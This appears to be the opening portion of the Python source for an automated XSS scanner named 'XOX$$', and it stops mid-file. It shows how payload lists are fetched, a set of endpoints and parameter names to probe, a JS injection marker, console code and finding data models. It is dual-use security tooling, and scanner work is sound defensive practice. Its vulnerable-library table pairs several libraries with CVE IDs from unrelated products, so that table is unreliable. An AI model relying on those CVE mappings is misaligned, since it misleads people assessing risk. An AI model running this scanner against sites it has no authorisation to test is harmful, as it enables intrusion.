#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XOX$$ - Advanced, persistent, context-aware XSS scanner.

Highlights
----------
* Context-aware payload selection (HTML / attribute / script / comment / JSON / URL)
* HTTP-first probing, browser verification only for real candidates (fast + low FP)
* Runtime DOM sink instrumentation (innerHTML / eval / document.write / setTimeout ...)
* Persistent scan state: resume interrupted scans, dedupe findings across runs
* Retries, backoff, rate limiting, circuit-friendly HTTP engine with response cache
* Optional passive recon: subdomains, historic URLs, OpenAPI, JS intelligence
* WAF fingerprinting + tamper/encoder chains
* Blind-XSS confirmation through interactsh or callback/file pollers
* Reports: console, JSON, Markdown, self-contained HTML, optional screenshots
* Graceful degradation: works without Selenium (`--no-browser`) and without uvloop (Windows)

Authorised testing only. You are responsible for the targets you scan.
"""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import html as html_lib
import json
import os
import random
import re
import shutil
import shlex
import socket
import string
import sys
import tempfile
import textwrap
import threading
import time
import traceback
import urllib.parse
import urllib.request
import uuid
import warnings
from collections import Counter
from contextlib import asynccontextmanager, suppress
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import TYPE_CHECKING, Any, Dict, List, Optional, Sequence, Set, Tuple
from urllib.parse import (
    parse_qsl,
    quote,
    urlencode,
    urljoin,
    urlsplit,
    urlunsplit,
)

# Advanced modules
try:
    from xoxss.analysis.polyglot import PolyglotGenerator as PolyglotPayloadGenerator
    from xoxss.analysis.per_char import PerCharProbe
    from xoxss.analysis.jsonp import JSONPAnalyzer as JSONPDetector
    from xoxss.analysis.csp import CSPAnalyzer
    from xoxss.analysis.cors import CORSAnalyzer
    from xoxss.analysis.mxss import MXSSDetector
    from xoxss.analysis.proto_pollution import (
        PROTO_MARKER_KEY,
        PROTO_PROBE_JS,
        PrototypePollutionDetector,
        build_proto_exploit,
        build_proto_probes,
        gadget_exploit_names,
    )
    from xoxss.analysis.rate_limit import SmartRateLimiter
    from xoxss.analysis.dom_clobbering import DOMClobberingDetector
    from xoxss.analysis.trusted_types import TrustedTypesAnalyzer
    from xoxss.analysis.graphql import GraphQLAnalyzer
    from xoxss.analysis.websocket import WebSocketAnalyzer
    from xoxss.analysis.file_upload import FileUploadAnalyzer
    from xoxss.analysis.postmessage import PostMessageAnalyzer
    from xoxss.detection.payload import build_blind_payloads
    HAS_ADVANCED = True
except Exception:
    HAS_ADVANCED = False
    build_blind_payloads = None  # type: ignore
    PROTO_MARKER_KEY = "xoxss"  # type: ignore
    PROTO_PROBE_JS = ""  # type: ignore
    PrototypePollutionDetector = None  # type: ignore
    build_proto_exploit = None  # type: ignore
    build_proto_probes = None  # type: ignore
    gadget_exploit_names = None  # type: ignore

try:
    from xoxss.detection.waf import (
        BLOCK_WORDS,
        BODY_SIGNATURES,
        HEADER_SIGNATURES,
        fingerprint as fingerprint_waf,
        looks_blocked,
    )
except Exception:  # pragma: no cover - keeps the scanner importable in isolation
    HEADER_SIGNATURES = {}  # type: ignore
    BODY_SIGNATURES = {}  # type: ignore
    BLOCK_WORDS = ()  # type: ignore
    fingerprint_waf = None  # type: ignore
    looks_blocked = None  # type: ignore

# Recon / analysis / OOB / external-tool integration.  Imports are guarded so a
# partially installed checkout still exposes the core scanner.
try:
    from xoxss.analysis.ast_taint import analyze_javascript as analyze_js_taint
    from xoxss.analysis.ast_taint import summarize_flows as summarize_taint_flows
    from xoxss.detection.encoders import (
        apply_chain as apply_encoder_chain,
        describe_encoders,
        encoder_names,
        get_encoder,
    )
    from xoxss.oob import CallbackPoller, FilePoller, InteractshClient, OOBManager
    from xoxss.recon.jsintel import (
        JSIntel,
        analyze_javascript_intel,
        extract_attr_urls,
        extract_html_parameters,
        extract_inline_scripts,
        extract_script_urls,
        sources_from_sourcemap,
    )
    from xoxss.recon.openapi import APIOperation, OpenAPIFinder
    from xoxss.recon.passive import PassiveURLCollector
    from xoxss.recon.subdomains import SubdomainFinder, root_domain
    from xoxss.scan.fuzzer import (
        FUZZ_EXTENSIONS,
        PARAM_WORDS,
        DirFuzzer,
        ParameterMiner,
    )
    from xoxss.tools.external import ExternalFinding, ExternalToolkit, available_tools
    HAS_RECON = True
except Exception as _recon_exc:  # pragma: no cover
    HAS_RECON = False
    _RECON_IMPORT_ERROR = str(_recon_exc)
    analyze_js_taint = None  # type: ignore
    summarize_taint_flows = None  # type: ignore
    apply_encoder_chain = None  # type: ignore
    describe_encoders = None  # type: ignore
    encoder_names = lambda: []  # type: ignore
    get_encoder = None  # type: ignore
    CallbackPoller = FilePoller = InteractshClient = OOBManager = None  # type: ignore
    JSIntel = object  # type: ignore
    analyze_javascript_intel = None  # type: ignore
    extract_attr_urls = extract_html_parameters = extract_inline_scripts = None  # type: ignore
    extract_script_urls = sources_from_sourcemap = None  # type: ignore
    APIOperation = object  # type: ignore
    OpenAPIFinder = None  # type: ignore
    PassiveURLCollector = None  # type: ignore
    SubdomainFinder = root_domain = None  # type: ignore
    FUZZ_EXTENSIONS = ()  # type: ignore
    PARAM_WORDS = ()  # type: ignore
    DirFuzzer = ParameterMiner = None  # type: ignore
    ExternalFinding = object  # type: ignore
    ExternalToolkit = None  # type: ignore
    available_tools = lambda: {}  # type: ignore

try:
    from xoxss.scan.parameters import ParameterHarvester, ReflectionProbe
    HAS_PARAM_AUDIT = True
except Exception as _param_exc:  # pragma: no cover
    HAS_PARAM_AUDIT = False
    _PARAM_IMPORT_ERROR = str(_param_exc)
    ParameterHarvester = None  # type: ignore
    ReflectionProbe = None  # type: ignore


try:
    from xoxss.detection.reflection import score_reflection

    HAS_REFLECTION_SCORING = True
except Exception:  # pragma: no cover - package optional during partial installs
    HAS_REFLECTION_SCORING = False

    def score_reflection(payload: str, response: str, marker: str = ""):  # type: ignore
        return 0.0, 100.0


from xoxss.reports.sarif import (  # noqa: E402
    build_sarif_document,
    sarif_rule_id,
)
from xoxss.reports.html import write_html_report
from xoxss.reports.json import report_payload, write_json_report
from xoxss.reports.markdown import write_markdown_report

try:
    from xoxss.utils import ui as _ui
except Exception:  # pragma: no cover - standalone checkout edge case
    _ui = None

if TYPE_CHECKING:  # pragma: no cover - typing only, never executed
    # These imports exist purely for static analysis. The runtime import below is
    # guarded so the scanner can start and print a friendly error when aiohttp is
    # missing; referring to ``aiohttp`` in annotations would otherwise make it a
    # variable (``None``) and trigger reportInvalidTypeForm.
    import aiohttp
    from aiohttp import ClientResponse, ClientSession
    from bs4 import BeautifulSoup as BeautifulSoupType

try:  # required
    import aiohttp

    HAS_AIOHTTP = True
except Exception:  # pragma: no cover
    aiohttp = None  # type: ignore
    HAS_AIOHTTP = False

try:  # required
    from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning

    HAS_BS4 = True
    warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)
except Exception:  # pragma: no cover
    BeautifulSoup = None  # type: ignore
    HAS_BS4 = False


def _soup(html_text: str) -> BeautifulSoupType:
    """Parse HTML, raising a clear error when BeautifulSoup is unavailable."""
    if BeautifulSoup is None:
        raise RuntimeError("beautifulsoup4 is required: pip install -r requirements.txt")
    return BeautifulSoup(html_text, "html.parser")


APP_NAME = "XOX$$"
VERSION = "2.0.0"
CODENAME = "PERSISTENT"
DEFAULT_STATE_DIR = ".xoxss"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
)

# Remote payload lists. They are downloaded to the system temp directory at start-up
# (``/tmp`` on POSIX, ``%TEMP%`` on Windows) and removed when the scan finishes.
PAYLOAD_SOURCES: Tuple[str, ...] = (
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-payloadbox.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-Bypass-Strings-BruteLogic.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md",
)
MAX_PAYLOAD_BYTES = 4 * 1024 * 1024
MAX_REMOTE_PAYLOADS = 5000

# Common paths probed by ``--discover-paths`` (kept intentionally small and safe: GET only).
COMMON_ENDPOINTS: Tuple[str, ...] = (
    "/api",
    "/api/v1",
    "/api/v2",
    "/graphql",
    "/rest",
    "/admin",
    "/login",
    "/signin",
    "/search",
    "/find",
    "/query",
    "/upload",
    "/profile",
    "/account",
    "/user",
    "/users",
    "/settings",
    "/dashboard",
    "/contact",
    "/feedback",
    "/comment",
    "/comments",
    "/posts",
    "/post",
    "/news",
    "/blog",
    "/article",
    "/download",
    "/redirect",
    "/callback",
    "/oauth",
    "/sso",
    "/status",
    "/health",
    "/swagger.json",
    "/openapi.json",
    "/api/docs",
    "/docs",
    "/debug",
    "/test",
    "/.well-known/security.txt",
)

# Parameter names tried on discovered endpoints that do not expose any query string.
FUZZ_PARAM_NAMES: Tuple[str, ...] = (
    "q",
    "s",
    "search",
    "query",
    "keyword",
    "name",
    "id",
    "page",
    "url",
    "redirect",
    "next",
    "callback",
    "message",
    "text",
    "input",
    "value",
    "email",
    "username",
    "title",
    "content",
    "return",
    "view",
)

# Patterns used to pull API routes out of inline/external JavaScript.
JS_ENDPOINT_PATTERNS = (
    re.compile(
        r"""\b(?:fetch|axios\.(?:get|post|put|patch|delete)|\.open)\s*\(\s*["'`]([^"'`\s]{1,500})["'`]""",
        re.I,
    ),
    re.compile(
        r"""\b(?:url|endpoint|api|path|action|href|src)\s*[:=]\s*["'`]([^"'`\s]{1,500})["'`]""",
        re.I,
    ),
    re.compile(r"""["'`]((?:https?://|/|\./|\.\./)[^"'`\s<>]{1,500})["'`]""", re.I),
)

# Extensions worth scanning even though they are not HTML pages.
SCANNABLE_EXTENSIONS = {
    ".json",
    ".xml",
    ".php",
    ".asp",
    ".aspx",
    ".jsp",
    ".do",
    ".action",
    ".cgi",
    ".pl",
    ".py",
    ".rb",
}

# Known vulnerable JavaScript libraries (simplified retire.js-style database)
# Format: library_name -> (min_vulnerable_version, max_vulnerable_version, cve_id, severity)
VULNERABLE_LIBS = {
    "jquery": {
        "1.0.0": ("1.0.0", "1.12.4", "CVE-2019-11358", "high"),
        "2.0.0": ("2.0.0", "2.2.4", "CVE-2019-11358", "high"),
        "3.0.0": ("3.0.0", "3.4.0", "CVE-2020-11022,CVE-2020-11023", "high"),
    },
    "angular": {
        "1.0.0": ("1.0.0", "1.7.9", "CVE-2018-8005", "medium"),
        "2.0.0": ("2.0.0", "2.4.10", "CVE-2018-8005", "medium"),
        "4.0.0": ("4.0.0", "4.5.9", "CVE-2018-8005", "medium"),
        "5.0.0": ("5.0.0", "5.2.9", "CVE-2018-8005", "medium"),
    },
    "react": {
        "0.0.0": ("0.0.0", "0.14.9", "CVE-2016-10742", "medium"),
        "15.0.0": ("15.0.0", "15.6.2", "CVE-2018-6343", "medium"),
        "16.0.0": ("16.0.0", "16.3.0", "CVE-2018-6343", "medium"),
    },
    "vue": {
        "0.0.0": ("0.0.0", "2.5.16", "CVE-2018-19687", "medium"),
    },
    "bootstrap": {
        "1.0.0": ("1.0.0", "1.4.0", "CVE-2019-8331", "medium"),
        "2.0.0": ("2.0.0", "2.3.2", "CVE-2019-8331", "medium"),
        "3.0.0": ("3.0.0", "3.4.1", "CVE-2019-8331", "medium"),
        "4.0.0": ("4.0.0", "4.3.1", "CVE-2019-8331", "medium"),
    },
    "d3": {
        "0.0.0": ("0.0.0", "3.5.16", "CVE-2018-12411", "medium"),
    },
    "handlebars": {
        "0.0.0": ("0.0.0", "4.0.11", "CVE-2019-20933", "high"),
    },
    "lodash": {
        "0.0.0": ("0.0.0", "4.17.14", "CVE-2019-10744", "high"),
    },
    "moment": {
        "0.0.0": ("0.0.0", "2.24.0", "CVE-2019-13555", "medium"),
    },
    "axios": {
        "0.0.0": ("0.0.0", "0.19.0", "CVE-2020-28168", "medium"),
    },
    "ckeditor": {
        "0.0.0": ("0.0.0", "4.11.4", "CVE-2019-8197", "high"),
    },
    "tinymce": {
        "0.0.0": ("0.0.0", "4.9.11", "CVE-2019-17571", "high"),
    },
    "prototype": {
        "0.0.0": ("0.0.0", "1.7.3", "CVE-2015-1830", "high"),
    },
    "scriptaculous": {
        "0.0.0": ("0.0.0", "1.9.0", "CVE-2015-1830", "high"),
    },
    "swfobject": {
        "0.0.0": ("0.0.0", "2.2.0", "CVE-2018-12446", "medium"),
    },
}

# --------------------------------------------------------------------------------------
# Terminal colours
# --------------------------------------------------------------------------------------


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    DIM = "\033[2m"
    PURPLE = "\033[95m"
    PARAM = "\033[96m"
    CYAN = "\033[96m"
    GREY = "\033[90m"

    @classmethod
    def disable(cls) -> None:
        for name in list(vars(cls)):
            if name.isupper():
                setattr(cls, name, "")


# --------------------------------------------------------------------------------------
# Small helpers
# --------------------------------------------------------------------------------------


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def slugify(value: str, maxlen: int = 48) -> str:
    slug = re.sub(r"[^a-zA-Z0-9._-]+", "-", value).strip("-")
    return (slug or "target")[:maxlen]


def truncate(text: Any, limit: int = 400) -> str:
    text = str(text)
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


def strip_ansi(text: str) -> str:
    return re.sub(r"\033\[[0-9;]*m", "", text)


def sanitize_text(text: Any, limit: int = 100000) -> str:
    """Escape control characters but keep newlines and our own SGR colour codes."""
    s = str(text).replace("\r", "\\r").replace("\x00", "\\0")
    # Neutralise every escape sequence except SGR colour codes (ESC[...m).
    s = re.sub(r"\x1b(?!\[[0-9;]*m)", lambda m: "\\x1b", s)
    s = re.sub(r"[\x01-\x08\x0b\x0c\x0e-\x1a\x1c-\x1f\x7f]", lambda m: "\\x%02x" % ord(m.group()), s)
    return s[:limit]


def fmt_duration(seconds: float) -> str:
    seconds = max(0.0, float(seconds))
    if seconds < 60:
        return f"{seconds:.2f}s"
    minutes, sec = divmod(int(seconds), 60)
    hours, minutes = divmod(minutes, 60)
    if hours:
        return f"{hours}h {minutes}m {sec}s"
    return f"{minutes}m {sec}s"


def unique_token(prefix: str = "z", length: int = 9) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return prefix + "".join(random.choice(alphabet) for _ in range(length))


def js_marker(token: str) -> str:
    """Quote-free JS snippet that records `token` in window.__xoxss_hits.

    Quote-free matters: the same marker is embedded inside single quoted,
    double quoted and unquoted HTML attributes without breaking them.
    """
    codes = ",".join(str(ord(ch)) for ch in token)
    return (
        f"/*{token}*/window.__xoxss_hits=(window.__xoxss_hits||[]);"
        f"window.__xoxss_hits.push(String.fromCharCode({codes}))"
    )


def replace_query_param(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    out: List[Tuple[str, str]] = []
    replaced = False
    for key, old in pairs:
        if key == param and not replaced:
            out.append((key, value))
            replaced = True
        else:
            out.append((key, old))
    if not replaced:
        out.append((param, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(out, doseq=True), ""))


def merge_query(url: str, extra: Dict[str, str]) -> str:
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    out: List[Tuple[str, str]] = []
    remaining = dict(extra)
    for key, old in pairs:
        if key in remaining:
            out.append((key, remaining.pop(key)))
        else:
            out.append((key, old))
    out.extend(remaining.items())
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(out, doseq=True), ""))


def normalize_url(url: str) -> str:
    parts = urlsplit(url.strip())
    scheme = (parts.scheme or "http").lower()
    netloc = parts.netloc.lower()
    path = parts.path or "/"
    query = urlencode(parse_qsl(parts.query, keep_blank_values=True))
    return urlunsplit((scheme, netloc, path, query, ""))


SKIP_EXTENSIONS = {
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".ico", ".bmp", ".tif", ".tiff",
    ".css", ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".mp3", ".mp4", ".avi", ".mov", ".mkv", ".wav", ".webm", ".ogg",
    ".pdf", ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
    ".exe", ".msi", ".dmg", ".apk", ".ipa", ".bin", ".iso",
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".csv",
    ".js", ".mjs", ".map", ".json", ".xml", ".txt", ".rss", ".atom",
}

DANGEROUS_PATH_WORDS = (
    "logout", "log-out", "signout", "sign-out", "delete", "remove", "destroy",
    "unsubscribe", "cancel-account", "deactivate", "reset-password",
)


def looks_like_page(url: str) -> bool:
    path = urlsplit(url).path.lower()
    ext = os.path.splitext(path)[1]
    if ext and ext in SKIP_EXTENSIONS:
        return False
    if any(word in path for word in DANGEROUS_PATH_WORDS):
        return False
    return True


def looks_like_dangerous(url: str) -> bool:
    lowered = (urlsplit(url).path or "").lower()
    return any(word in lowered for word in DANGEROUS_PATH_WORDS)


def looks_like_scan_target(url: str, fuzz_params: bool = False) -> bool:
    """True when a discovered URL is worth scanning for XSS."""
    if looks_like_dangerous(url):
        return False
    parts = urlsplit(url)
    if parts.query:
        return True
    path = parts.path.lower()
    ext = os.path.splitext(path)[1]
    if ext in SKIP_EXTENSIONS and ext not in SCANNABLE_EXTENSIONS:
        return False
    if looks_like_page(url):
        return True
    return bool(fuzz_params)


def extract_endpoints_from_text(text: str, base_url: str) -> List[str]:
    """Extract API routes / page URLs from HTML or JavaScript source."""
    if not text:
        return []
    found: List[str] = []
    seen: Set[str] = set()
    for pattern in JS_ENDPOINT_PATTERNS:
        for match in pattern.finditer(text):
            raw = match.group(1).strip()
            if not raw or len(raw) > 500:
                continue
            # Skip template expressions, markup fragments and escaped strings.
            if any(marker in raw for marker in ("${", "{", "}", "<", ">", "\\", " ")):
                continue
            lowered = raw.lower()
            if lowered.startswith(("javascript:", "data:", "mailto:", "tel:", "#", "blob:")):
                continue
            if lowered.endswith(
                (
                    ".js", ".mjs", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
                    ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webm", ".mp3",
                )
            ):
                continue
            if raw.startswith("//"):
                raw = urlsplit(base_url).scheme + ":" + raw
            absolute = urljoin(base_url, raw)
            parts = urlsplit(absolute)
            if parts.scheme not in ("http", "https") or not parts.netloc:
                continue
            normalized = normalize_url(absolute)
            if normalized in seen:
                continue
            seen.add(normalized)
            found.append(absolute)
    return found


# --------------------------------------------------------------------------------------
# Console
# --------------------------------------------------------------------------------------


class Console:
    """Thread-safe console with optional live status line and file logging."""

    def __init__(
        self,
        verbose: bool = False,
        quiet: bool = False,
        log_file: Optional[str] = None,
        events_file: Optional[str] = None,
    ):
        self.verbose = verbose
        self.quiet = quiet
        self._lock = threading.RLock()
        self._status_text = ""
        self._status_thread: Optional[threading.Thread] = None
        self._status_stop = threading.Event()
        self._status_enabled = (not quiet) and sys.stdout.isatty()
        self.counts: Counter = Counter()
        self._log_path: Optional[Path] = None
        self._events_path: Optional[Path] = Path(events_file) if events_file else None
        self._events_error_reported = False
        if log_file:
            self._log_path = Path(log_file)
            self._log_path.parent.mkdir(parents=True, exist_ok=True)
            try:
                self._log_path.write_text("", encoding="utf-8")
            except OSError:
                self._log_path = None

    def event(self, name: str, **fields: Any) -> None:
        """Write one versioned JSONL event for automation and live monitoring."""
        if self._events_path is None:
            return
        event = {
            "schema_version": 1,
            "timestamp": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
            "event": name,
            **fields,
        }
        try:
            self._events_path.parent.mkdir(parents=True, exist_ok=True)
            with self._lock:
                with self._events_path.open("a", encoding="utf-8") as handle:
                    handle.write(json.dumps(event, ensure_ascii=False, default=str) + "\n")
        except OSError as exc:
            if not self._events_error_reported:
                self._events_error_reported = True
                self.warn(f"Cannot write event stream {self._events_path}: {exc}")

    # -- status line ------------------------------------------------------------------
    def start_status(self) -> None:
        if not self._status_enabled or self._status_thread is not None:
            return
        self._status_stop.clear()
        self._status_thread = threading.Thread(target=self._status_loop, daemon=True)
        self._status_thread.start()

    def stop_status(self) -> None:
        self._status_stop.set()
        if self._status_thread is not None:
            self._status_thread.join(timeout=1.0)
            self._status_thread = None
        with self._lock:
            self._clear_status_locked()

    def set_status(self, text: str) -> None:
        with self._lock:
            self._status_text = text

    def _status_loop(self) -> None:
        while not self._status_stop.wait(0.5):
            with self._lock:
                try:
                    if self._status_text:
                        sys.stdout.write("\r\033[K" + self._status_text)
                        sys.stdout.flush()
                except Exception:
                    pass

    def _clear_status_locked(self) -> None:
        if self._status_enabled:
            try:
                sys.stdout.write("\r\033[K")
                sys.stdout.flush()
            except Exception:
                pass

    # -- printing ---------------------------------------------------------------------
    def _width(self) -> int:
        try:
            return max(60, shutil.get_terminal_size((110, 30)).columns)
        except Exception:
            return 100

    @staticmethod
    def _prefix(level: str) -> str:
        labels = {"info": "[*]", "ok": "[+]", "warn": "[!]", "error": "[-]", "debug": "[>]", "raw": ""}
        colors = {
            "info": bcolors.OKBLUE,
            "ok": bcolors.OKGREEN,
            "warn": bcolors.WARNING,
            "error": bcolors.FAIL,
            "debug": bcolors.GREY,
            "raw": "",
        }
        label = labels.get(level, "")
        if not label:
            return ""
        colour = colors.get(level, "")
        if not colour:
            return f"{label} "
        if level == "error":
            # Errors stay loud: bold red, no subtlety.
            return f"{bcolors.FAIL}{bcolors.BOLD}{label}{bcolors.ENDC} "
        # Dim brackets, loud glyph - the level reads instantly when scrolling.
        return (
            f"{bcolors.GREY}[{bcolors.ENDC}{colour}{label[1]}{bcolors.ENDC}"
            f"{bcolors.GREY}]{bcolors.ENDC} "
        )

    def rule(self, text: str = "", *, important: bool = True) -> None:
        """Styled section header (`-- TITLE ---------------` on plain encodings)."""
        if self.quiet:
            return
        if _ui is not None:
            line = _ui.rule(text, width=self._width() - 1)
        else:
            line = f"-- {text.upper()} ".ljust(self._width(), "-")
        self._emit("raw", line, important=True)

    def _wrap(self, message: str, width: int) -> str:
        lines: List[str] = []
        for raw in str(message).splitlines() or [""]:
            wrapped = textwrap.wrap(
                raw,
                width=max(20, width),
                break_long_words=False,   # keep PoC URLs / curl commands copy-paste intact
                break_on_hyphens=False,
            )
            lines.extend(wrapped or [""])
        return "\n".join(lines)

    def _emit(self, level: str, message: str, important: bool = False) -> None:
        if self.quiet and not important:
            return
        if level == "debug" and not self.verbose:
            return
        width = self._width()
        prefix = self._prefix(level)
        if level == "raw":
            # Hand-formatted output (banner, rules, tables, panels) is laid out
            # by its caller; re-wrapping it would break columns and rules.
            body_lines = sanitize_text(message).split("\n")
        else:
            body = self._wrap(sanitize_text(message), width - 4)
            body_lines = body.split("\n")
        text = prefix + body_lines[0]
        for line in body_lines[1:]:
            text += "\n    " + line

        with self._lock:
            self.counts[level] += 1
            self._clear_status_locked()
            try:
                sys.stdout.write(text + "\n")
                sys.stdout.flush()
            except UnicodeEncodeError:
                enc = getattr(sys.stdout, "encoding", "ascii") or "ascii"
                sys.stdout.write(text.encode(enc, "replace").decode(enc, "replace") + "\n")
                sys.stdout.flush()
            except Exception:
                pass
            if self._status_text and self._status_enabled:
                try:
                    sys.stdout.write("\r\033[K" + self._status_text)
                    sys.stdout.flush()
                except Exception:
                    pass
            if self._log_path is not None:
                try:
                    with self._log_path.open("a", encoding="utf-8", errors="replace") as handle:
                        handle.write(f"{now_iso()} {strip_ansi(text)}\n")
                except OSError:
                    pass

    def info(self, message: str, important: bool = False) -> None:
        self._emit("info", message, important)

    def ok(self, message: str, important: bool = True) -> None:
        self._emit("ok", message, important)

    def warn(self, message: str, important: bool = True) -> None:
        self._emit("warn", message, important)

    def error(self, message: str, important: bool = True) -> None:
        self._emit("error", message, important)

    def debug(self, message: str) -> None:
        self._emit("debug", message)

    def raw(self, message: str = "") -> None:
        self._emit("raw", message, important=True)

    def finding(self, finding: "Finding") -> None:
        confidence_style = {
            "confirmed": f"{bcolors.FAIL}{bcolors.BOLD}",
            "high": f"{bcolors.WARNING}{bcolors.BOLD}",
            "medium": f"{bcolors.WARNING}",
            "low": f"{bcolors.GREY}",
        }.get(finding.confidence, bcolors.ENDC)
        lines = [
            f"{bcolors.BOLD}{finding.kind}{bcolors.ENDC}  "
            f"{confidence_style}[{finding.confidence}]{bcolors.ENDC}",
            f"{bcolors.GREY}URL        :{bcolors.ENDC} {finding.url}",
            f"{bcolors.GREY}Parameter  :{bcolors.ENDC} {finding.parameter} ({finding.method})",
            f"{bcolors.GREY}Payload    :{bcolors.ENDC} {finding.payload}",
        ]
        if finding.context:
            lines.append(f"{bcolors.GREY}Context    :{bcolors.ENDC} {finding.context}")
        if finding.evidence:
            lines.append(f"{bcolors.GREY}Evidence   :{bcolors.ENDC} {truncate(finding.evidence, 240)}")
        if finding.detail:
            lines.append(f"{bcolors.GREY}Detail     :{bcolors.ENDC} {finding.detail}")
        if finding.screenshot:
            lines.append(f"{bcolors.GREY}Screenshot :{bcolors.ENDC} {finding.screenshot}")
        if finding.poc_url:
            lines.append(
                f"{bcolors.GREY}PoC URL    :{bcolors.ENDC} {finding.poc_url}"
            )
        if finding.poc_command:
            lines.append(
                f"{bcolors.GREY}PoC command:{bcolors.ENDC} {finding.poc_command}"
            )
        self._emit("ok", "\n".join(lines), important=True)


# --------------------------------------------------------------------------------------
# Banner
# --------------------------------------------------------------------------------------

BANNER_UNICODE = r"""
██╗  ██╗ ██████╗ ██╗  ██╗ ███████╗ ███████╗
╚██╗██╔╝██╔═══██╗╚██╗██╔╝ ██╔════╝ ██╔════╝
 ╚███╔╝ ██║   ██║ ╚███╔╝  ███████╗ ███████╗
 ██╔██╗ ██║   ██║ ██╔██╗  ╚════██║ ╚════██║
██╔╝ ██╗╚██████╔╝██╔╝ ██╗ ███████║ ███████║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝
"""

BANNER_ASCII = r"""
 __  __  ____  __  __   ___   ___
 \ \/ / / __ \ \ \/ /  / _ \ / _ \
  \  / | |  | | \  /  | | | | | | |
  /  \ | |__| | /  \  | |_| | |_| |
 /_/\_\ \____/ /_/\_\  \___/ \___/
"""


def banner(console: Optional[Console] = None) -> None:
    art = BANNER_UNICODE
    encoding = getattr(sys.stdout, "encoding", None) or "utf-8"
    try:
        art.encode(encoding)
    except (UnicodeEncodeError, LookupError):
        art = BANNER_ASCII

    painted = _ui.paint_ramp(art) if _ui is not None else None
    if painted is None:
        if art is BANNER_ASCII:
            painted = f"{bcolors.OKCYAN}{art}{bcolors.ENDC}"
        else:
            painted = art.replace("█", f"{bcolors.OKCYAN}█{bcolors.ENDC}").replace(
                "╗", f"{bcolors.OKCYAN}╗{bcolors.ENDC}"
            )

    subtitle = (
        f"  {bcolors.BOLD}{bcolors.OKCYAN}{APP_NAME}{bcolors.ENDC}"
        f"{bcolors.DIM}  -  Advanced Automated XSS Scanner  -  v{VERSION}{bcolors.ENDC}"
        f"  {bcolors.WARNING}{bcolors.BOLD}{CODENAME}{bcolors.ENDC}"
    )
    meta = (
        f"  {bcolors.DIM}stateful / context-aware / browser-verified / "
        f"{CODENAME.lower()}{bcolors.ENDC}"
    )
    if _ui is not None and _ui.enabled():
        underline = _ui.rule("", width=46)
        meta = f"{meta}\n  {underline}"
    text = f"{painted}\n{subtitle}\n{meta}"
    if console is not None:
        console.raw(text)
    else:
        print(text)

# --------------------------------------------------------------------------------------
# Data models
# --------------------------------------------------------------------------------------


@dataclass
class Finding:
    kind: str
    url: str
    parameter: str
    method: str
    payload: str
    evidence: str = ""
    confidence: str = "confirmed"  # confirmed | high | medium | low
    confidence_rationale: str = ""
    context: str = ""
    detail: str = ""
    screenshot: str = ""
    # Reproduction proof.  `poc_url` is a ready-to-open URL (GET points);
    # `poc_command` is a shell command (POST/header/cookie points).  Both are
    # built from the injection only - no cookies or session data are included.
    poc_url: str = ""
    poc_command: str = ""
    subkey: str = ""
    tags: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=now_iso)

    def key(self) -> str:
        # Family-level key: "Reflected XSS (HTTP evidence)" and "Reflected XSS" collapse,
        # and payload variants on the same injection point are de-duplicated.  Some
        # findings (secrets, static DOM flows) legitimately share a URL/parameter, so
        # they can opt into an extra subkey.
        family = self.kind.split(" (")[0]
        raw = "|".join([family, self.url, self.parameter, self.method, self.subkey])
        return hashlib.sha1(raw.encode("utf-8", "replace")).hexdigest()

    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        if not result["confidence_rationale"]:
            result["confidence_rationale"] = {
                "confirmed": "Direct confirmation evidence was recorded for this finding.",
                "high": "Strong technical evidence was recorded; browser execution was not recorded for this finding.",
                "medium": "A supporting signal was observed without direct execution proof.",
                "low": "A heuristic signal needs manual validation.",
            }.get(self.confidence, "Confidence was not classified; review the evidence manually.")
        return result


@dataclass
class ScanStats:
    requests: int = 0
    errors: int = 0
    truncated_responses: int = 0
    blocked: int = 0
    payloads: int = 0
    points: int = 0
    urls_total: int = 0
    urls_done: int = 0
    findings: int = 0
    browser_checks: int = 0
    endpoints: int = 0
    js_files: int = 0
    secrets: int = 0
    subdomains: int = 0
    passive_urls: int = 0
    fuzzed_paths: int = 0
    discovered_params: int = 0
    ast_flows: int = 0
    oob_registered: int = 0
    oob_hits: int = 0
    external_findings: int = 0
    started: float = field(default_factory=time.time)

    @property
    def elapsed(self) -> float:
        return time.time() - self.started


@dataclass
